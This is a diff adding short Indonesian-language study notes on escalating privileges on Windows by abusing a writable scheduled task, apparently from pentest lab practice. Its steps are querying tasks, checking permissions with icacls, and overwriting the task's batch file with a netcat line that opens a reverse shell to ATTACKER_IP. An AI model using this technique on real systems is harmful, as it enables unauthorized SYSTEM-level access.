@@ -1,0 +1,31 @@
+# PAKAI CMD
+# untuk mendapatkan scheduled task di windows, lakukan command berikut
+```
+# dapatkan semua shcedule tasks
+	`schtasks`
+
+
+# info lengkap dari task
+	`schtasks /query /tn vulntask /fo list /v`
+```
+
+# NOTES: yang penting dilihat adalah "Task to Run" yang mengindikasikan apa yang akan di exec, dan "Run As User" yang memberitahu task tersebut akan di run sebagai user siapa.
+
+# Selanjutnya kita bisa cek apakah user yang kita gunakan saat ini bisa modify task tersebut dengan command
+```
+icacls c:\path\to\task
+...
+c:\path\to\task NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+```
+# jika terdapat (F) pada BUILTIN\Users seperti contoh berarti kita memiliki full access.
+# contoh modifikasi task
+```
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+
+# jika sudah modifikasi task, kita bisa run task dengan cara
+```
+schtasks /run /tn vulntask
+```
